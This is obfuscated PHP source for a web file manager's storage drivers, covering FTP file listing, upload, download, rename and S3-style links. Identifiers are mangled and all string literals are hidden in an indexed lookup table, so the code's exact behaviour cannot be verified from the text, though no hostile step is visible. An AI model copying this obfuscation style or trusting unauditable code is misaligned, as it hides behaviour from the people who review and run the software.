$óùÚÉ˜ = $this->fileNameAuto($this->pathFather($âö½·³œ), $ù²¹ÌªÎ); $óùÚÉ˜ = $this->iconvSystem($óùÚÉ˜); $âö½·³œ = $this->iconvSystem($âö½·³œ); $“ÂÇ¥¡Ğ = $this->pathFather($âö½·³œ); $ÃôÃ¬óŸ = rtrim($“ÂÇ¥¡Ğ, $€Öö¡Öõ[8]) . $€Öö¡Öõ[8] . $óùÚÉ˜; $ÍØâïì = @ftp_rename($this->connect, $âö½·³œ, $ÃôÃ¬óŸ); if (!$ÍØâïì) { $this->writeLog(__FUNCTION__ . $€Öö¡Öõ[1468], !0); return !1; } $ÃôÃ¬óŸ = $this->iconvApp($ÃôÃ¬óŸ); return $this->getPathOuter($ÃôÃ¬óŸ); } private function folderInfo($´š½ÀÜÓ, $µ…–­Îî = false) { $Ìûœ±Ò‘ =& $_SERVER[‹‰”››ê]; $”õ²©ã = array($Ìûœ±Ò‘[32] => $this->pathThis($´š½ÀÜÓ), $Ìûœ±Ò‘[87] => $this->getPathOuter($Ìûœ±Ò‘[8] . $´š½ÀÜÓ), $Ìûœ±Ò‘[33] => $Ìûœ±Ò‘[78]); if ($µ…–­Îî) { return $”õ²©ã; } $”õ²©ã[$Ìûœ±Ò‘[234]] = $”õ²©ã[$Ìûœ±Ò‘[88]] = 0; $”õ²©ã[$Ìûœ±Ò‘[235]] = $”õ²©ã[$Ìûœ±Ò‘[236]] = !0; return $”õ²©ã; } private function fileInfo($–šÊ§¥¡, $€Ñëëø = false, $¬ÈŠ»Ã = array()) { $†éáÆ³à =& $_SERVER[‹‰”››ê]; $‘»ãäËƒ = array($†éáÆ³à[32] => $this->pathThis($–šÊ§¥¡), $†éáÆ³à[87] => $this->getPathOuter($†éáÆ³à[8] . $–šÊ§¥¡), $†éáÆ³à[33] => $†éáÆ³à[233], $†éáÆ³à[79] => isset($¬ÈŠ»Ã[$†éáÆ³à[79]]) ? $¬ÈŠ»Ã[$†éáÆ³à[79]] : 0, $†éáÆ³à[169] => $this->ext($–šÊ§¥¡)); if ($€Ñëëø) { return $‘»ãäËƒ; } $‘»ãäËƒ[$†éáÆ³à[234]] = $‘»ãäËƒ[$†éáÆ³à[88]] = 0; $‘»ãäËƒ[$†éáÆ³à[235]] = $‘»ãäËƒ[$†éáÆ³à[236]] = !0; $ãµª¸Òã = $this->iconvSystem($–šÊ§¥¡); $‘»ãäËƒ[$†éáÆ³à[88]] = @ftp_mdtm($this->connect, $ãµª¸Òã); if (empty($¬ÈŠ»Ã)) { $¬ÈŠ»Ã = $this->objectMeta($–šÊ§¥¡); if (!$¬ÈŠ»Ã) { return $‘»ãäËƒ; } } $‘»ãäËƒ[$†éáÆ³à[79]] = $¬ÈŠ»Ã[$†éáÆ³à[79]]; return $‘»ãäËƒ; } public function size($’î¾…Š) { $…°…Âã‘ = $this->objectMeta($’î¾…Š); return $…°…Âã‘ ? $…°…Âã‘[$_SERVER[‹‰”››ê][79]] : 0; } public function info($Íëç‹Á) { if ($this->isFile($Íëç‹Á)) { return $this->fileInfo($Íëç‹Á, 0); } else { if ($this->isFolder($Íëç‹Á)) { return $this->folderInfo($Íëç‹Á); } } return !1; } private function fileList($üı²µ‡´, &$¶ŠÃ¡‡Õ, &$Ñ¯í˜ü«, $İ‹‘›Æô = false) { $›í§²ó‡ =& $_SERVER[‹‰”››ê]; $üı²µ‡´ = $this->iconvSystem($üı²µ‡´); if (!$this->isFolder($üı²µ‡´)) { return !1; } $üı²µ‡´ = rtrim($üı²µ‡´, $›í§²ó‡[8]) . $›í§²ó‡[8]; check_abort(); $ó÷ø™ôÛ = @ftp_rawlist($this->connect, $üı²µ‡´); if (!$ó÷ø™ôÛ) { $ó÷ø™ôÛ = array(); } $ƒñÂúá˜ = array($›í§²ó‡[10] => 1, $›í§²ó‡[1379] => 1); foreach ($ó÷ø™ôÛ as $Áü‚Ø‘) { $‡†â­Æ› = $this->_listItem($Áü‚Ø‘); if ($‡†â­Æ›[0] == $›í§²ó‡[848]) { continue; } $¡Ò¾“«¢ = $‡†â­Æ›[8]; if (empty($¡Ò¾“«¢) && $¡Ò¾“«¢ !== $›í§²ó‡[231] || isset($ƒñÂúá˜[$¡Ò¾“«¢])) { continue; } $¡Ò¾“«¢ = $this->iconvApp($üı²µ‡´ . ltrim($¡Ò¾“«¢, $›í§²ó‡[8])); $ËÍ°ôáÓ = array($›í§²ó‡[32] => $¡Ò¾“«¢, $›í§²ó‡[33] => $›í§²ó‡[233], $›í§²ó‡[79] => $‡†â­Æ›[4]); if (substr($Áü‚Ø‘, 0, 1) == $›í§²ó‡[1469]) { $ËÍ°ôáÓ[$›í§²ó‡[33]] = $›í§²ó‡[78]; $ËÍ°ôáÓ[$›í§²ó‡[79]] = 0; } $îÜŠÀ•Š = $ËÍ°ôáÓ[$›í§²ó‡[33]] == $›í§²ó‡[78] ? !0 : !1; $this->cacheMethodInfoSet($¡Ò¾“«¢, $îÜŠÀ•Š, $ËÍ°ôáÓ); if ($îÜŠÀ•Š) { $¶ŠÃ¡‡Õ[] = $¡Ò¾“«¢; if ($İ‹‘›Æô) { $this->fileList($¡Ò¾“«¢, $¶ŠÃ¡‡Õ, $Ñ¯í˜ü«, $İ‹‘›Æô); } continue; } $Ñ¯í˜ü«[] = $ËÍ°ôáÓ; } $this->cacheMethodInfoSet($üı²µ‡´, !0); } private function _listItem($º‹—ö‘) { if (empty($º‹—ö‘)) { return array(); } $¡ŠÈÓ‰ì = preg_split($_SERVER[‹‰”››ê][1470], $º‹—ö‘); if (count($¡ŠÈÓ‰ì) <= 9) { return $¡ŠÈÓ‰ì; } $¡ŠÈÓ‰ì[8] = trim(substr($º‹—ö‘, strpos($º‹—ö‘, $¡ŠÈÓ‰ì[7]) + strlen($¡ŠÈÓ‰ì[7]))); return array_splice($¡ŠÈÓ‰ì, 0, 9); } public function listPath($·ŸşÙ, $ÎÅğíÅ² = false) { $ºì§ø¶ =& $_SERVER[‹‰”››ê]; if (!$this->_isconn()) { return !1; } $»‚¢ÚŠ = $ç†æôëá = array(); $this->fileList($·ŸşÙ, $»‚¢ÚŠ, $ç†æôëá); foreach ($»‚¢ÚŠ as $ØşË¦‘ => $ —Ù­ƒÏ) { $»‚¢ÚŠ[$ØşË¦‘] = $this->folderInfo($ —Ù­ƒÏ, $ÎÅğíÅ²); } foreach ($ç†æôëá as $ØşË¦‘ => $ —Ù­ƒÏ) { $ç†æôëá[$ØşË¦‘] = $this->fileInfo($ —Ù­ƒÏ[$ºì§ø¶[32]], $ÎÅğíÅ², $ —Ù­ƒÏ); } return array($ºì§ø¶[85] => $»‚¢ÚŠ, $ºì§ø¶[86] => $ç†æôëá); } public function has($õÙ»ˆÁ­, $í–³ğ¹ = false, $Õş‘â‡é = true) { $©Ø×Š€’ =& $_SERVER[‹‰”››ê]; $÷Ô¸äÄÓ = $»ãûÃ„· = array(); $ıè×äõÄ = $í–³ğ¹ ? !0 : !1; $this->fileList($õÙ»ˆÁ­, $÷Ô¸äÄÓ, $»ãûÃ„·, $ıè×äõÄ); if ($í–³ğ¹) { return array($©Ø×Š€’[242] => count($»ãûÃ„·), $©Ø×Š€’[243] => count($÷Ô¸äÄÓ)); } if ($Õş‘â‡é) { if (count($»ãûÃ„·)) { return !0; } } else { if (count($÷Ô¸äÄÓ)) { return !0; } } return !1; } public function listAll($ïÌµ¶éß) { $•˜ğ™ =& $_SERVER[‹‰”››ê]; if (!$this->_isconn()) { return !1; } $´Şè±â = $·ü–Êİ° = array(); $this->fileList($ïÌµ¶éß, $´Şè±â, $·ü–Êİ°, !0); $ÜÈÍıì¬ = array_to_keyvalue($·ü–Êİ°, $•˜ğ™[32]); foreach ($´Şè±â as $×ŸüÎó½) { if (is_string($×ŸüÎó½)) { $ÜÈÍıì¬[$×ŸüÎó½] = array($•˜ğ™[79] => 0); } } return $this->listAllFiles($ïÌµ¶éß, $ÜÈÍıì¬); } public function getContent($øç¹ŒŸ ) { if (!$this->_isconn()) { return !1; } $øç¹ŒŸ  = $this->iconvSystem($øç¹ŒŸ ); return $this->fileSubstr($øç¹ŒŸ ); } public function setContent($˜ò™¤Ì¼, $ÒÍ‰Üç· = '') { if (!$this->_isconn()) { return !1; } $”«”Š–à = $this->pathThis($this->iconvSystem($˜ò™¤Ì¼)); $ı±èù‰ = $this->tempFile($”«”Š–à); file_put_contents($ı±èù‰, $ÒÍ‰Üç·); $ƒÉâ¡°µ = $this->upload($˜ò™¤Ì¼, $this->iconvApp($ı±èù‰)); $this->tempFileRemve($ı±èù‰); return $ƒÉâ¡°µ; } public function fileSubstr($ÄÑ†Ô¯Ú, $­ƒá¡«Ç = 0, $ÊÀ€ãœ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÄÑ†Ô¯Ú, $­ƒá¡«Ç, $ÊÀ€ãœ); } private function ftpRequest($¡È¬»ãÆ, $Â“÷øÒ´ = 0, $¦²†­’— = false) { $ÁøÄ˜…á =& $_SERVER[‹‰”››ê]; $¡È¬»ãÆ = $ÁøÄ˜…á[8] . ltrim(str_ltrim($¡È¬»ãÆ, $this->ftpPath), $ÁøÄ˜…á[8]); $¡È¬»ãÆ = $this->iconvSystem($¡È¬»ãÆ); $ü•©ş½á = $this->scheme . $this->host . $ÁøÄ˜…á[4] . $this->port; $Æ†”´ˆñ = curl_init(); curl_setopt($Æ†”´ˆñ, CURLOPT_URL, $ü•©ş½á . $this->pathEncode($¡È¬»ãÆ)); curl_setopt($Æ†”´ˆñ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¦²†­’—) { $ş¬°„Ó = $Â“÷øÒ´ + $¦²†­’— - 1; curl_setopt($Æ†”´ˆñ, CURLOPT_RANGE, "{$Â“÷øÒ´}\55{$ş¬°„Ó}"); } curl_setopt($Æ†”´ˆñ, CURLOPT_RETURNTRANSFER, 1); $£í¿ë‚æ = curl_exec($Æ†”´ˆñ); curl_close($Æ†”´ˆñ); return $£í¿ë‚æ; } public function upload($¢­ÎÖãò, $ÀõÒ¯½, $·èìÂÛ§ = false, $æ«ğ¹¦ğ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¢­ÎÖãò))) { return !1; } $¢­ÎÖãò = $this->iconvSystem($¢­ÎÖãò); $ÀõÒ¯½ = $this->iconvSystem($ÀõÒ¯½); $®•¹³š = ftp_nb_put($this->connect, $¢­ÎÖãò, $ÀõÒ¯½, FTP_BINARY); while ($®•¹³š == FTP_MOREDATA) { $®•¹³š = ftp_nb_continue($this->connect); } if ($®•¹³š != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } return $this->getPathOuter($¢­ÎÖãò); } public function download($ìöøâôü, $Ë”–¤ªİ = '') { if (!$this->_isconn()) { return !1; } $Ôç×„ğÖ = $this->pathFather($Ë”–¤ªİ); if (!IO::mkdir($Ôç×„ğÖ)) { return !1; } $ìöøâôü = $this->iconvSystem($ìöøâôü); $Ë”–¤ªİ = $this->iconvSystem($Ë”–¤ªİ); $ó›Ò¸Ç = ftp_nb_get($this->connect, $Ë”–¤ªİ, $ìöøâôü, FTP_BINARY); while ($ó›Ò¸Ç == FTP_MOREDATA) { $ó›Ò¸Ç = ftp_nb_continue($this->connect); } if ($ó›Ò¸Ç != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } return $this->iconvApp($Ë”–¤ªİ); } public function exist($àœ‹Ç™Ñ) { return $this->isFile($àœ‹Ç™Ñ) || $this->isFolder($àœ‹Ç™Ñ); } public function isFile($”ò§ü‚á) { return !$this->isFolder($”ò§ü‚á) && $this->objectMeta($”ò§ü‚á); } public function isFolder($‘ËñÛÑ˜) { return $this->cacheMethod($_SERVER[‹‰”››ê][180], $‘ËñÛÑ˜); } protected function objectMeta($±ƒùñÅ) { return $this->cacheMethod($_SERVER[‹‰”››ê][182], $±ƒùñÅ); } protected function _objectMeta($ñÑÍ…†) { $îÃ¿åÂÕ =& $_SERVER[‹‰”››ê]; if ($ñÑÍ…† == $îÃ¿åÂÕ[12] || $ñÑÍ…† == $îÃ¿åÂÕ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ñÑÍ…† = $this->iconvSystem($ñÑÍ…†); $ú£™æı = array($îÃ¿åÂÕ[32] => $this->iconvApp($ñÑÍ…†), $îÃ¿åÂÕ[33] => $îÃ¿åÂÕ[233], $îÃ¿åÂÕ[79] => 0); $Â¨¯ä ä = @ftp_size($this->connect, $ñÑÍ…†); if ($Â¨¯ä ä != -1) { $ú£™æı[$îÃ¿åÂÕ[79]] = $Â¨¯ä ä; } else { $ƒ£„óÙ = @ftp_chdir($this->connect, $ñÑÍ…†); if (!$ƒ£„óÙ) { return !1; } @ftp_chdir($this->connect, $îÃ¿åÂÕ[8]); $ú£™æı[$îÃ¿åÂÕ[33]] = $îÃ¿åÂÕ[78]; } return $ú£™æı; } protected function _isFolder($Ë¾Åø œ) { $„«£šş… =& $_SERVER[‹‰”››ê]; if ($Ë¾Åø œ == $„«£šş…[12] || $Ë¾Åø œ == $„«£šş…[8]) { return !0; } $‡Óç¥íç = $this->_objectMeta($Ë¾Åø œ); return isset($‡Óç¥íç[$„«£šş…[33]]) && $‡Óç¥íç[$„«£šş…[33]] == $„«£šş…[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($›ò¬”«ó) { parent::__construct($›ò¬”«ó); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } public function uploadLink($ïÍÖÖÙ, $â†Ó¬öÎ = 0) { $û·®ÄÎÂ =& $_SERVER[‹‰”››ê]; if ($this->isUploadServer()) { return; } $êşãÕÄì = $this->getType(); if (!in_array($êşãÕÄì, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÇëÕêâÎ = (!$â†Ó¬öÎ ? 1 : ceil($â†Ó¬öÎ / pow(1024, 3))) * 3600 * 4; $„¶éâ€¶ = $this->uploadMultiData($ïÍÖÖÙ, $ÇëÕêâÎ); if ($„¶éâ€¶) { $„¶éâ€¶[$û·®ÄÎÂ[97]] = $ïÍÖÖÙ; $„¶éâ€¶[$û·®ÄÎÂ[98]] = $êşãÕÄì; } return $„¶éâ€¶; } public function fileOutImage($İûµ•‚–, $øäáù«´ = 250) { if ($this->size($İûµ•‚–) > 1024 * 1024 * 25) { return $this->fileOutImageServer($İûµ•‚–, $øäáù«´); } $…íğˆÏ = $this->link($İûµ•‚–); $…íğˆÏ .= $_SERVER[‹‰”››ê][1471] . $øäáù«´; $this->fileOutLink($…íğˆÏ); } public function fileOutLink($ı¶ÇÌÂÏ) { $àƒæûò =& $_SERVER[‹‰”››ê]; if (substr($ı¶ÇÌÂÏ, 0, 7) == $àƒæûò[219]) { $ı¶ÇÌÂÏ = $àƒæûò[220] . substr($ı¶ÇÌÂÏ, 7); } header($àƒæûò[175] . $ı¶ÇÌÂÏ); die; } } goto dŸÈ®å­Ş·; FÏÁº˜›ñ»: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ì‹»Ì£¯ =& $_SERVER[‹‰”››ê]; $this->objectDriver = array($ì‹»Ì£¯[60], $ì‹»Ì£¯[61], $ì‹»Ì£¯[62], $ì‹»Ì£¯[63], $ì‹»Ì£¯[64], $ì‹»Ì£¯[65], $ì‹»Ì£¯[66], $ì‹»Ì£¯[67], $ì‹»Ì£¯[68], $ì‹»Ì£¯[69], $ì‹»Ì£¯[70], $ì‹»Ì£¯[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($üöÒ´öË) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($üöÒ´öË, $_SERVER[‹‰”››ê][8]); } return $üöÒ´öË; } public function iconvApp($È¶­ğº¥) { return $È¶­ğº¥; } public function iconvSystem($Ú‰æ‘›‘) { return $Ú‰æ‘›‘; } public function iconvTo($¡¤¯æ«·, $‡¹ûÏ‹Î, $ª£öê) { $äóÂ´ƒ =& $_SERVER[‹‰”››ê]; if (!$¡¤¯æ«· || !function_exists($äóÂ´ƒ[72])) { return $¡¤¯æ«·; } static $©ê€©ÙÒ = array(); $äí¥›ù = $‡¹ûÏ‹Î . $äóÂ´ƒ[73] . $ª£öê . $äóÂ´ƒ[74] . $¡¤¯æ«·; if (isset($©ê€©ÙÒ[$äí¥›ù])) { return $©ê€©ÙÒ[$äí¥›ù]; } if (function_exists($äóÂ´ƒ[75])) { $’–ñÈ¶€ = @mb_convert_encoding($¡¤¯æ«·, $ª£öê, $‡¹ûÏ‹Î); } else { $’–ñÈ¶€ = @iconv($‡¹ûÏ‹Î, $ª£öê, $¡¤¯æ«·); } $’–ñÈ¶€ = $’–ñÈ¶€ ? $’–ñÈ¶€ : $¡¤¯æ«·; if (strstr($’–ñÈ¶€, $äóÂ´ƒ[76])) { $’–ñÈ¶€ = str_replace($äóÂ´ƒ[76], $äóÂ´ƒ[11], $’–ñÈ¶€); } $©ê€©ÙÒ[$‡¹ûÏ‹Î . $äóÂ´ƒ[73] . $ª£öê . $äóÂ´ƒ[74] . $¡¤¯æ«·] = $’–ñÈ¶€; $©ê€©ÙÒ[$ª£öê . $äóÂ´ƒ[73] . $‡¹ûÏ‹Î . $äóÂ´ƒ[74] . $¡¤¯æ«·] = $¡¤¯æ«·; $©ê€©ÙÒ[$ª£öê . $äóÂ´ƒ[73] . $‡¹ûÏ‹Î . $äóÂ´ƒ[74] . $’–ñÈ¶€] = $¡¤¯æ«·; $©ê€©ÙÒ[$‡¹ûÏ‹Î . $äóÂ´ƒ[73] . $ª£öê . $äóÂ´ƒ[74] . $’–ñÈ¶€] = $’–ñÈ¶€; return $’–ñÈ¶€; } public function getPathInner($•„¨ö¸È) { $ƒÛŠ‘äË = IO::init($•„¨ö¸È); return $ƒÛŠ‘äË->path; } public function getPathOuter($Ù¬«Í¸´) { $œŸ‘ü»“ =& $_SERVER[‹‰”››ê]; $á®ïƒé = strlen(trim($this->pathBase, $œŸ‘ü»“[8])); $Ù¬«Í¸´ = substr(trim($Ù¬«Í¸´, $œŸ‘ü»“[8]), $á®ïƒé); return $this->pathDriver . $œŸ‘ü»“[8] . ltrim($Ù¬«Í¸´, $œŸ‘ü»“[8]); } public function isParentOf($øÀŒ«×È, $‡ñç¦Üã) { $óÏŸ•ÀÜ =& $_SERVER[‹‰”››ê]; $øÀŒ«×È = rtrim(strtolower($øÀŒ«×È), $óÏŸ•ÀÜ[8]) . $óÏŸ•ÀÜ[8]; $‡ñç¦Üã = rtrim(strtolower($‡ñç¦Üã), $óÏŸ•ÀÜ[8]) . $óÏŸ•ÀÜ[8]; $Œ·¶óµ‡ = strpos($‡ñç¦Üã, $øÀŒ«×È) === 0; return $Œ·¶óµ‡; } public function getType() { $È‘µ¨Áˆ =& $_SERVER[‹‰”››ê]; $Ï¸íø = str_replace($È‘µ¨Áˆ[77], $È‘µ¨Áˆ[12], get_class($this)); return strtolower($Ï¸íø); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‰à‰¬˜æ, $œüö†æ) { $—û™‡áó =& $_SERVER[‹‰”››ê]; $Äœîà¨ = rtrim($‰à‰¬˜æ, $—û™‡áó[8]) . $—û™‡áó[8] . $œüö†æ; $™¯¯°ÇØ = $this->exist($Äœîà¨); return $™¯¯°ÇØ ? $Äœîà¨ : !1; } public function setModifyTime($‡’…ÄÑı, $…²¸ò­Ë = '') { } public function renameObject($™õ“ïÎ­, $€äöÂœœ) { $ä×ÅÌÖ = $€äöÂœœ; $™õ“ïÎ­ = $this->getPathOuter($™õ“ïÎ­); $€äöÂœœ = $this->pathFather($™õ“ïÎ­) . $€äöÂœœ; $ÆßÓİ² = IO::copy($™õ“ïÎ­, $this->pathFather($™õ“ïÎ­), REPEAT_RENAME_FOLDER, $ä×ÅÌÖ); if ($ÆßÓİ²) { IO::remove($™õ“ïÎ­); } return $ÆßÓİ² ? $€äöÂœœ : !1; } public function tempFile($Š¢ññÓÈ = '', $µ¡„»úÇ = '') { if (!$Š¢ññÓÈ) { $Š¢ññÓÈ = rand_string(15); } $›ÃªÅŒæ = TEMP_FILES . rand_string(15) . $_SERVER[‹‰”››ê][8]; @mkdir($›ÃªÅŒæ, DEFAULT_PERRMISSIONS, !0); $æ‘øˆ• = $›ÃªÅŒæ . $Š¢ññÓÈ; @touch($æ‘øˆ•); if ($µ¡„»úÇ) { file_put_contents($æ‘øˆ•, $µ¡„»úÇ); } return $æ‘øˆ•; } public function tempFileRemve($Ä¹úŸ²) { @unlink($Ä¹úŸ²); @rmdir($this->pathFather($Ä¹úŸ²)); } public function mkfile($â­…åÛ, $ôœƒÊïŸ = '', $ö²¯íÓñ = REPEAT_RENAME) { } public function mkdir($šĞÍ­öø, $µÂ¿©±Ú = REPEAT_SKIP) { } public function delFile($‡æ‚Û²·) { } public function delFolder($¼Ş÷éÒ–) { } public function copyFile($éÊÕïÖš, $©Á´öóç) { } public function moveFile($°ù»ß«, $¼“šêÃğ) { } public function remove($…Ø¸ª) { if ($this->isFile($…Ø¸ª)) { return $this->delFile($…Ø¸ª); } return $this->delFolder($…Ø¸ª); } public function rename($Å‡Ÿø©Ç, $Ùíœ¬é) { } public function exist($ñ‘·İ¦‚) { } public function findByHash($íÄüÆìÈ = '', $•¸³ì¡å = '') { return !1; } public function isFile($Ñ²ˆ¤êœ) { } public function isFolder($¹å·áÑ‹) { } public function size($§øôñ“«) { } public function info($ó¹ò¯Ÿ) { } public function infoSimple($ÑûÌŸ¢Û) { return $this->info($ÑûÌŸ¢Û); } public function infoAuth($ÇöàËî) { return $this->info($ÇöàËî); } public function infoFull($ŞÎ«Åµı) { return $this->info($ŞÎ«Åµı); } public function infoFullSimple($Ê³œê¤¸) { return $this->info($Ê³œê¤¸); } public function infoWithChildren($¨É¿úì) { $¾ØèÑ¿¥ =& $_SERVER[‹‰”››ê]; static $àŞÂ¢ö = array(); if (isset($àŞÂ¢ö[$¨É¿úì])) { return $àŞÂ¢ö[$¨É¿úì]; } $ôä©üêã = $this->info($¨É¿úì); if ($ôä©üêã && $ôä©üêã[$¾ØèÑ¿¥[33]] == $¾ØèÑ¿¥[78]) { $ÚâÅ­ÀË = array($¾ØèÑ¿¥[79] => 0, $¾ØèÑ¿¥[80] => 0, $¾ØèÑ¿¥[81] => 0); $this->infoChildren($¨É¿úì, $ÚâÅ­ÀË); $ôä©üêã[$¾ØèÑ¿¥[79]] = $ÚâÅ­ÀË[$¾ØèÑ¿¥[79]]; $ôä©üêã[$¾ØèÑ¿¥[82]] = array($¾ØèÑ¿¥[83] => $ÚâÅ­ÀË[$¾ØèÑ¿¥[80]], $¾ØèÑ¿¥[84] => $ÚâÅ­ÀË[$¾ØèÑ¿¥[81]]); $àŞÂ¢ö[$¨É¿úì] = $ôä©üêã; } return $ôä©üêã; } public function listPath($á¨ı½’Ø, $¤¢Ş¹ˆ´ = false) { } public function has($“ÚĞ¶¤Ô, $³ñÙ˜¶˜ = false, $ÖÃ“øÍ“ = false) { } public function canRead($ÍîÏ ‘ª) { } public function canWrite($åÊäëÚ) { } public function getContent($£óúòƒ®) { } public function setContent($ÈÑ•óœş, $³ãÔòëÔ = '') { } protected function infoChildren($§å¿×, &$ïŞ‚üğ„) { $óÜÓÑ‹í =& $_SERVER[‹‰”››ê]; check_abort_echo(); $¬ÎÍš«ˆ = $this->listPath($§å¿×, !0); $¬ÎÍš«ˆ = array_merge($¬ÎÍš«ˆ[$óÜÓÑ‹í[85]], $¬ÎÍš«ˆ[$óÜÓÑ‹í[86]]); foreach ($¬ÎÍš«ˆ as $µ…ºÆè) { if ($µ…ºÆè[$óÜÓÑ‹í[33]] == $óÜÓÑ‹í[78]) { $ïŞ‚üğ„[$óÜÓÑ‹í[81]]++; $¾Š›¼õÂ = $this->getPathInner($µ…ºÆè[$óÜÓÑ‹í[87]]); $this->infoChildren($¾Š›¼õÂ, $ïŞ‚üğ„); } else { $ïŞ‚üğ„[$óÜÓÑ‹í[80]]++; $ïŞ‚üğ„[$óÜÓÑ‹í[79]] += $µ…ºÆè[$óÜÓÑ‹í[79]]; } } } public function fileSubstr($ûœÌ »Á, $Òº€ı†ì, $„¸’ã™á) { } public function listAll($Ö¹æ×›Ì) { } public function listAllMake($ì« æó†, &$îÖì˜ö€) { $ä¬óÚÅ§ =& $_SERVER[‹‰”››ê]; check_abort_echo(); $§¾Õ¢” = $this->listPath($ì« æó†, !0); if (!$§¾Õ¢”) { return; } $²ç¶ıìÏ = array_merge($§¾Õ¢”[$ä¬óÚÅ§[85]], $§¾Õ¢”[$ä¬óÚÅ§[86]]); foreach ($²ç¶ıìÏ as $–æ¹ƒö) { $ºªÆ¿İ = $–æ¹ƒö[$ä¬óÚÅ§[33]] == $ä¬óÚÅ§[78]; $õŞ“ãí = array($ä¬óÚÅ§[87] => $–æ¹ƒö[$ä¬óÚÅ§[87]], $ä¬óÚÅ§[78] => $ºªÆ¿İ); if (isset($–æ¹ƒö[$ä¬óÚÅ§[79]])) { $õŞ“ãí[$ä¬óÚÅ§[79]] = $–æ¹ƒö[$ä¬óÚÅ§[79]]; } if (isset($–æ¹ƒö[$ä¬óÚÅ§[88]])) { $õŞ“ãí[$ä¬óÚÅ§[88]] = $–æ¹ƒö[$ä¬óÚÅ§[88]]; } if (!$ºªÆ¿İ) { $îÖì˜ö€[] = $õŞ“ãí; continue; } $îÖì˜ö€[] = $õŞ“ãí; $Ó¡›Ò›È = $–æ¹ƒö[$ä¬óÚÅ§[87]]; $àŞò¬² = $this->pathDriver; if (substr($–æ¹ƒö[$ä¬óÚÅ§[87]], 0, strlen($àŞò¬²)) == $àŞò¬²) { $Ó¡›Ò›È = substr($Ó¡›Ò›È, strlen($àŞò¬²)); } $this->listAllMake($Ó¡›Ò›È, $îÖì˜ö€); } } public function listAllSimple($„šğÚì¹, $¼¬êˆ¸˜ = false) { $€±‰•Û¡ = $this->listAll($„šğÚì¹); return $this->listAllSimpleMake($€±‰•Û¡, $this->getPathOuter($„šğÚì¹), $¼¬êˆ¸˜); } public function listAllSimpleMake($ºÊ’æ¿¬, $’¬ÆÊÎ¬, $ìµÇÉÆ¦) { $ãüû¹é =& $_SERVER[‹‰”››ê]; $®öÊúÎ‘ = array(); $’¬ÆÊÎ¬ = rtrim(get_path_father($’¬ÆÊÎ¬), $ãüû¹é[8]) . $ãüû¹é[8]; foreach ($ºÊ’æ¿¬ as $ËËãÄûÉ) { $Ğ”ÓêÈ° = array($ãüû¹é[87] => $ËËãÄûÉ[$ãüû¹é[87]], $ãüû¹é[89] => $ËËãÄûÉ[$ãüû¹é[87]], $ãüû¹é[78] => $ËËãÄûÉ[$ãüû¹é[78]]); if (isset($ËËãÄûÉ[$ãüû¹é[79]]) && !$ËËãÄûÉ[$ãüû¹é[78]]) { $Ğ”ÓêÈ°[$ãüû¹é[79]] = $ËËãÄûÉ[$ãüû¹é[79]]; } if (isset($ËËãÄûÉ[$ãüû¹é[88]])) { $Ğ”ÓêÈ°[$ãüû¹é[88]] = $ËËãÄûÉ[$ãüû¹é[88]]; } if (is_array($ËËãÄûÉ[$ãüû¹é[90]])) { $Ğ”ÓêÈ°[$ãüû¹é[89]] = $ËËãÄûÉ[$ãüû¹é[90]][$ãüû¹é[87]]; $Ğ”ÓêÈ°[$ãüû¹é[79]] = $ËËãÄûÉ[$ãüû¹é[90]][$ãüû¹é[79]]; $Ğ”ÓêÈ°[$ãüû¹é[88]] = $ËËãÄûÉ[$ãüû¹é[90]][$ãüû¹é[88]]; } else { if (substr($ËËãÄûÉ[$ãüû¹é[87]], 0, strlen($’¬ÆÊÎ¬)) == $’¬ÆÊÎ¬) { $Ğ”ÓêÈ°[$ãüû¹é[87]] = substr($ËËãÄûÉ[$ãüû¹é[87]], strlen($’¬ÆÊÎ¬)); } } $¡óËüÕï = $ËËãÄûÉ[$ãüû¹é[78]] ? $ãüû¹é[8] : $ãüû¹é[12]; $Ğ”ÓêÈ°[$ãüû¹é[89]] = rtrim($Ğ”ÓêÈ°[$ãüû¹é[89]], $ãüû¹é[8]) . $¡óËüÕï; $Ğ”ÓêÈ°[$ãüû¹é[87]] = $ãüû¹é[8] . trim($Ğ”ÓêÈ°[$ãüû¹é[87]], $ãüû¹é[8]) . $¡óËüÕï; if (!$ìµÇÉÆ¦) { $ıí´Ğ« = explode($ãüû¹é[8], trim($Ğ”ÓêÈ°[$ãüû¹é[87]], $ãüû¹é[8])); $Ğ”ÓêÈ°[$ãüû¹é[87]] = $ãüû¹é[8] . implode($ãüû¹é[8], array_slice($ıí´Ğ«, 1)) . $¡óËüÕï; } $®öÊúÎ‘[] = $Ğ”ÓêÈ°; } return array_sort_by($®öÊúÎ‘, $ãüû¹é[87]); } public function upload($úœóÇÁ÷, $¨¸Ì²ÙÄ, $ôğÎÊÓ = false, $ˆ·üîÍ = REPEAT_REPLACE) { } public function uploadFileByID($¾°Üè¸›, $µ‰ß²Ÿ¶, $˜Û„§—Ğ) { } public function uploadFileByPath($÷©×ôè…, $¸–§“æ­, $Ï¾îãÈè = array()) { } public function isUploadServer() { $Ç¬¢¡äà =& $_SERVER[‹‰”››ê]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ç¬¢¡äà[91]) { return !0; } return $GLOBALS[$Ç¬¢¡äà[6]][$Ç¬¢¡äà[92]][$Ç¬¢¡äà[93]]; } public function isFileOutServer() { $åØİôÙ =& $_SERVER[‹‰”››ê]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $åØİôÙ[91]) { return !0; } return 